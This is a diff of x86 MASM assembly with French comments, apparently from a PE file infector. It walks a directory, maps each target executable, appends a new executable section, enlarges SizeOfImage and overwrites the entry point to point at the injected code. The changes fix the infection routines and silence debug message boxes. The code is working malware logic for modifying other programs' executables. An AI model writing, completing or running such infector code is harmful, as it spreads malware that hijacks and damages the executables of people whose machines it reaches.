@@ -199,8 +199,10 @@ GetLastSection endp
 
 OverwriteEntryPoint proc uses esi edi New:DWORD
 	mov esi, imgOptHeader
-	lea edi, [esi].IMAGE_OPTIONAL_HEADER
+	lea edi, [esi].IMAGE_OPTIONAL_HEADER.AddressOfEntryPoint
 	mov esi, New
+	mov DWORD PTR [edi], esi
+	;invoke MessageBox, 0, uhex$(esi), ADDR entryPointL, MB_OK
 	mov DWORD ptr [edi], esi
 	ret
 OverwriteEntryPoint endp
@@ -215,12 +217,17 @@ InjectSection proc lastSection:DWORD
 	
 	; Set un pointeur sur la section suivante (la notre)
 	mov edi, lastSection
+;	cmp machine86, 1
+;	je InjectSEnd
+;	add edi, 10h
+;InjectSEnd:
 	add edi, SIZEOF IMAGE_SECTION_HEADER
 	
-	;mov edx, imgOptHeader
-	lea ebx, [esi].IMAGE_OPTIONAL_HEADER.SizeOfImage
+	mov edx, imgOptHeader
+	lea ebx, [edx].IMAGE_OPTIONAL_HEADER.SizeOfImage
 	mov edx, [ebx]
 	add edx, 1000h
+	;invoke MessageBox, 0, uhex$(edx), ADDR entryPointL, MB_OK
 	mov [ebx], edx
 	
 	; Calcul de l'adresse de notre section
@@ -271,6 +278,7 @@ InjectSection proc lastSection:DWORD
 	lea edx, [edi].IMAGE_SECTION_HEADER.Characteristics
 	mov DWORD ptr [edx], 60000020h
 	
+	;ret 
 	; Test move to section.
 	mov edx, targetSection
 	mov ebx, mappedAddr
@@ -312,7 +320,7 @@ MapExe proc path:DWORD
 	invoke MapViewOfFile, hfileMap, FILE_MAP_ALL_ACCESS, 0, 0, 0h
 	
 	mov DWORD PTR mappedAddr, eax
-	invoke MessageBox, 0, uhex$(eax), ADDR strTitle, MB_OK
+	;invoke MessageBox, 0, uhex$(eax), ADDR strTitle, MB_OK
 
 	;
 	;
@@ -362,7 +370,7 @@ ProcessFile proc uses edi edx Directory:PTR BYTE, File:PTR BYTE
 	test eax, eax
 	jz ProcessFileEnd
 	
-	invoke MessageBox, 0, ADDR fileTarget, ADDR listTargetL, MB_OK
+	;invoke MessageBox, 0, ADDR fileTarget, ADDR listTargetL, MB_OK
  	invoke MapExe, ADDR fileTarget
  	;
  	; Mapping de l'exe
